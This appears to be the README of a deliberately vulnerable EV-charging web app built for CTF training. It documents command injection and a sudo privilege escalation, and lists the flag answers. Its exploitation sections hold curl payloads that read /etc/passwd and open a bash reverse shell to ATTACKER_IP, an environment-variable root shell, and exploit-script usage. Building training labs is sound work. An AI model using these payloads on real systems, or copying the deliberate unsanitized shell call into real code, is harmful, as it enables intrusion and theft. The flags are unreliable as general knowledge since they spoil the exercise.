# EcoCharge Portal - CTF Vulnerable Web Application

## Overview

EcoCharge Portal is an intentionally vulnerable web application simulating a regional EV charging network operator's website. This application is designed for cybersecurity training and CTF (Capture The Flag) competitions.

**⚠️ WARNING: This application contains intentional security vulnerabilities. Do NOT deploy in production environments!**

## Technology Stack

- **Framework**: Next.js 14.2.5
- **Frontend**: React 18.3.1, Tailwind CSS
- **Runtime**: Node.js 18+
- **Database**: SQLite (for caching)

## Vulnerabilities

### 1. CWE-78: Command Injection (PRIMARY)

**Location**: `/app/api/qr/route.js`  
**Endpoint**: `GET /api/qr`  
**Parameter**: `station`

The QR code generator endpoint passes the `station` parameter directly to a shell command without sanitization.

**Discovery Path**:
1. Browse to any station page (e.g., `/stations/EV-CH-001`)
2. Click the QR code button
3. Observe the API call in DevTools: `/api/qr?station=EV-CH-001&format=png`
4. Try invalid format: `/api/qr?station=EV-CH-001&format=pdf`
5. Debug response reveals command structure
6. Inject commands via station parameter

**Exploitation**:
```bash
# Check vulnerability (debug info disclosure)
curl "http://target:3000/api/qr?station=EV-CH-001&format=pdf"

# Command injection
curl "http://target:3000/api/qr?station=EV-CH-001;id&format=png"

# Read files
curl "http://target:3000/api/qr?station=EV-CH-001;cat+/etc/passwd&format=png"

# Reverse shell
curl "http://target:3000/api/qr?station=EV-CH-001;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'&format=png"
```

### 2. CWE-78: Command Injection (Privilege Escalation)

**Location**: `/scripts/backup.js`  
**Trigger**: sudo execution by www-data user

After gaining initial access, attacker can escalate privileges via the backup script.

**Exploitation**:
```bash
# Check sudo permissions
sudo -l

# Privilege escalation
export BACKUP_TARGET="; /bin/bash -p"
sudo /usr/bin/node /opt/maintenance/backup.js
```

### 3. Information Disclosure

**Location**: `.env` file, API responses  
**Type**: Credential and configuration leak

The `.env` file contains:
- API Gateway credentials
- Internal service URLs
- JWT secrets
- CTF flags

## CTF Flags

| # | Flag | Location | Method |
|---|------|----------|--------|
| 1 | `FLAG{w3b_rCE_qr_1nj3ct10n}` | `/var/www/FLAG_1.txt` | Command Injection RCE |
| 2 | `FLAG{pr1v3sc_b4ckup_sh3ll}` | `/root/FLAG_2.txt` | Privilege Escalation |
| 3 | `FLAG{cr3d3nt14ls_1n_c0nf1g_f1l3s}` | `.env` file | Credential Discovery |

## API Endpoints

| Endpoint | Method | Description | Vulnerable |
|----------|--------|-------------|------------|
| `/api/qr` | GET | QR code generator | ✅ Command Injection |
| `/api/qr` | POST | Batch QR generation | ✅ Command Injection |
| `/api/stations` | GET | List stations | Info Disclosure |
| `/api/stations` | POST | Get station by ID | - |
| `/api/auth` | POST | User authentication | - |
| `/api/user` | GET | Get user data | IDOR |

## Installation

### Prerequisites
- Node.js 18+
- npm or yarn
- qrencode (for QR generation): `apt install qrencode`

### Setup
```bash
# Clone repository
git clone https://github.com/your-org/ecocharge-website.git
cd ecocharge-website

# Install dependencies
npm install

# Development mode
npm run dev

# Production build
npm run build
npm start
```

### Docker
```bash
docker build -t ecocharge-portal .
docker run -p 3000:3000 ecocharge-portal
```

## Network Configuration

| Parameter | Value |
|-----------|-------|
| Default Port | 3000 |
| Recommended IP | 192.168.250.50 |
| Network Zone | Frontend Zone |

## Directory Structure

```
ecocharge-website/
├── app/
│   ├── api/
│   │   ├── qr/              # VULNERABLE - Command Injection
│   │   │   └── route.js
│   │   ├── stations/
│   │   ├── auth/
│   │   └── user/
│   ├── stations/
│   │   ├── page.js
│   │   └── [id]/
│   │       └── page.js      # QR code modal
│   ├── admin/
│   └── ...
├── scripts/
│   └── backup.js            # VULNERABLE - PrivEsc
├── exploit.py               # Exploitation script
├── .env                     # Sensitive configuration
└── README.md
```

## Exploit Script Usage

```bash
# Check if target is vulnerable
python3 exploit.py http://192.168.250.50:3000 check

# Execute command
python3 exploit.py http://192.168.250.50:3000 exec 'id'
python3 exploit.py http://192.168.250.50:3000 exec 'cat /etc/passwd'

# Get reverse shell
python3 exploit.py http://192.168.250.50:3000 revshell 192.168.125.100 4444
```

## Defensive Recommendations

1. **Input Validation**: Sanitize all user inputs before use in shell commands
2. **Parameterized Commands**: Use parameterized execution instead of string concatenation
3. **Least Privilege**: Remove unnecessary sudo permissions
4. **Environment Security**: Never store secrets in `.env` files on web servers
5. **Error Handling**: Don't expose debug information in production

## Security Notice

This application is intentionally vulnerable and should only be used in:
- Isolated lab environments
- CTF competitions
- Security training courses

**Never expose this application to the internet or use in production.**

## Related Scenario Components

This web server is part of the EcoCharge CTF scenario:
- **API Gateway**: 192.168.100.20 (DMZ)
- **Grafana**: 192.168.100.30 (DMZ)
- **Jump Host**: 192.168.100.40 (DMZ)
- **CSMS**: 192.168.20.20 (Internal)

## License

Educational use only. Created for cybersecurity training purposes.

---

**Version**: 1.1.0  
**Last Updated**: February 2025  
**Vulnerability**: CWE-78 Command Injection
